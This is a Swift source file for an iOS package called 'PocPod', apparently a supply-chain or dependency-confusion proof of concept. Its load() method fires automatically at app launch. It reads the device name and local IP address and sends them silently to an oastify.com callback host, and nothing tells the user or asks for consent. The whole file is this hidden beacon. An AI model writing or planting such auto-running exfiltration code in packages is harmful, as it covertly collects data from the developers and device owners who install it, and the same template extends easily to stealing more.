import UIKit
import Foundation

@objc public class PocPod: NSObject {
    
    // ✅ Auto-trigger method called when the app starts
    @objc public static func load() {
        sendPing()
    }

    private static func sendPing() {
        let podName = "pocpockaiksi"
        let deviceName = UIDevice.current.name
        let ipAddress = getIPAddress() ?? "unknown"

        let urlStr = "https://lwlvh2q5jxf20cx77q7eln0r7idg16pv.oastify.com/?pod=\(podName)&device=\(deviceName)&ip=\(ipAddress)"
        guard let encodedUrl = urlStr.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed),
              let url = URL(string: encodedUrl) else {
            return
        }

        var req = URLRequest(url: url)
        req.httpMethod = "GET"
        URLSession.shared.dataTask(with: req).resume()
        print("📡 PocPod pingback triggered to: \(url)")
    }

    private static func getIPAddress() -> String? {
        var address: String?
        var ifaddr: UnsafeMutablePointer<ifaddrs>?

        if getifaddrs(&ifaddr) == 0 {
            var ptr = ifaddr
            while ptr != nil {
                defer { ptr = ptr?.pointee.ifa_next }

                guard let interface = ptr?.pointee else { continue }
                let addrFamily = interface.ifa_addr.pointee.sa_family

                if addrFamily == UInt8(AF_INET) {
                    if let name = String(validatingUTF8: interface.ifa_name), name != "lo0" {
                        var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
                        getnameinfo(interface.ifa_addr,
                                    socklen_t(interface.ifa_addr.pointee.sa_len),
                                    &hostname,
                                    socklen_t(hostname.count),
                                    nil,
                                    socklen_t(0),
                                    NI_NUMERICHOST)
                        address = String(cString: hostname)
                        break
                    }
                }
            }
            freeifaddrs(ifaddr)
        }

        return address
    }
}

